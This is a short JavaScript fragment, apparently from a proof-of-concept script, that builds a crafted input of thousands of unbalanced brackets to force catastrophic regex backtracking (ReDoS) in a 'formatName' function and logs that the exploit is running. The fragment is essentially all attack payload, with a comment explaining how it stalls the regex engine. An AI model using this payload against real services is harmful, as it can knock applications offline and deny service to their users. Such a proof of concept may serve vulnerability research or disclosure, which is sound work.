  // The pattern deliberately balances opening and closing brackets incorrectly to 
  // force the regex engine into a repetitive match-fail-backtrack cycle.
  const maliciousInput = "[" .repeat(15000) + "]" .repeat(14900) + "a";

  console.log('[*] Executing ReDoS PoC against vulnerable formatName logic...');
